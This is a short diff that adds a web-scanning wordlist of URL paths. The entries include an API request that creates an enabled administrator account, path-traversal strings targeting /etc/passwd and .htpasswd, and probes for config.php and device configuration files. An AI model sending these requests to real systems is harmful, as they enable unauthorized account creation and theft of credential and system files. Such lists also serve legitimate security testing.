@@ -1,0 +1,15 @@
+/api/v1/user/save?ID=&Username={{user}}&Role=管理员&Enable=true
+/js/log.js
+/device/config
+
+/config.php
+/config/config.php
+/include/config.php
+/includes/config.php
+/controlloLogin.js
+/home/000~ROOT~000/etc/passwd
+/000~ROOT~000/etc/passwd
+/OLDS/home/000~ROOT~000/etc/passwd
+/app/webroot/files/kcfinder/files/home/000~ROOT~000/etc/passwd
+/actpt_5g.data
+/js/../.htpasswd
